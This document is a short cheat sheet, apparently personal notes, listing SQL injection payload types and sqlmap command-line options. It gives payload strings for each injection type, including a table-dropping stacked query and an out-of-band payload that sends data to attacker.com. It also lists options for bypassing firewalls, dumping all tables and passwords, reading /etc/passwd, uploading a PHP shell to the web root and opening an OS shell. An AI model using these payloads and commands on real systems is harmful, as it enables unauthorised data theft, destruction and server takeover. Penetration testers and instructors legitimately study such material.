# Types
- Boolean-based blind SQL Injection: AND 1=1
- Error-based SQL Injection: AND GTID_SUBSET(@@version,0)
- UNION query-based: UNION ALL SELECT 1,@@version,3
- Stacked queries: ; DROP TABLE users
- Time-based blind SQL Injection: AND 1=IF(2>1,SLEEP(5),0)
- Inline queries: SELECT (SELECT @@version) from
- Out-of-band SQL Injection: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

# Commands
## Basic
- -u: Provide URL
- --r: Provide Request
- --cookie="id=1"
- --dump: Get all data
## Automatic and Filtering
- --batch: Skip user input
- --text-only
- --code=200
- --string=success
## Improve
- --level
- --risk
- --prefix="%'))"
- --suffix="-- -"
- --technique=BEU
- --union-cols=17
- --union-char='a'
- --union-from=users
- --no-cast: optimize the data collection
## Enumeration
- --banner: Database version banner
- --current-user
- --current-db
- --is-dba: Am I admin?
- --tables
- -C: Specify columns
- -T: Specify tables
- --start: Starting columns number
- --stop: Finishing columns number
- --where
- --dump-all: Content of all tables
- --exclude-sysdbs: Exclude some tables
- --schema
- --search -T user: Search table that content user or -C pass: Search column that content pass
- --passwords: Search for passwords in the databases
## Bypass
- --csrf-token="Specify the parameter"
- --randomize="Specify the parameter"
- --eval="import hashlib; h=hashlib.md5(id).hexdigest()" NOTE: Python code
- --tamper=between,randomcase It's necessary to bypass a WAF NOTE: --list-tampers to see all list
- --chunked
## SuperUser
- --file-read "/etc/passwd"
- --file-write "shell.php" (FIle created before) --file-dest "/var/www/html/shell.php"
- --os-shell --technique=E NOTE: Providing output, it's necessary specify technique
